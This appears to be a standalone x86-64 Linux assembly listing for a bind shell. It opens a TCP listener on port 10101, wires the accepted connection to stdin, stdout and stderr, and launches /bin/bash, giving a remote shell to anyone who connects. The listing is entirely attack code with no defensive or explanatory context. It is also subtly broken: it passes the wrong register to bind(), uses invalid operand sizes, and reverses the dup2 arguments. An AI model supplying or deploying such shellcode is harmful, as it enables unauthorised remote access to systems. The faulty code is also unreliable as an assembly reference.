section .bss
    sin resb 16
    sock resd 1
    fd resd 1

section .data
    bash db "/bin/bash", 0

section .text
    global _start

_start:
    ; Create socket
    mov rax, 41         ; syscall number for socket()
    mov rdi, 2          ; AF_INET
    mov rsi, 1          ; SOCK_STREAM
    xor rdx, rdx        ; IPPROTO_TCP
    syscall
    mov dword [sock], eax

    ; Set up address structure
    mov qword rdi, sin
    mov word [rdi], 2   ; AF_INET
    mov word [rdi + 2], 0x7527  ; Port 10101 in network byte order
    mov dword [rdi + 4], 0       ; INADDR_ANY
    mov rdx, 16         ; length
    ; Bind socket
    mov rax, 49         ; syscall number for bind()
    mov rsi, rdi        ; pointer to sockaddr_in structure
    mov rdx, 16         ; size of sockaddr_in structure
    syscall

    ; Listen for connections
    mov rax, 50         ; syscall number for listen()
    mov rdi, dword [sock]
    mov rsi, 1          ; backlog
    syscall

    ; Accept connection
    mov rax, 43         ; syscall number for accept()
    mov rdi, dword [sock]
    xor rsi, rsi        ; sockaddr pointer (NULL)
    xor rdx, rdx        ; sockaddr length pointer (NULL)
    syscall
    mov dword [fd], eax

    ; Redirect stdin, stdout, stderr to the socket
    mov rsi, eax
    xor rdi, rdi        ; stdin (0)
    mov rax, 33         ; syscall number for dup2()
    syscall

    mov rsi, eax
    mov rdi, 1          ; stdout (1)
    syscall

    mov rsi, eax
    mov rdi, 2          ; stderr (2)
    syscall

    ; Execute /bin/bash
    mov rdi, bash
    mov rax, 59         ; syscall number for execve()
    xor rsi, rsi        ; no arguments
    xor rdx, rdx        ; no environment variables
    syscall

    ; Exit
    mov rax, 60         ; syscall number for exit()
    xor rdi, rdi        ; exit code 0
    syscall
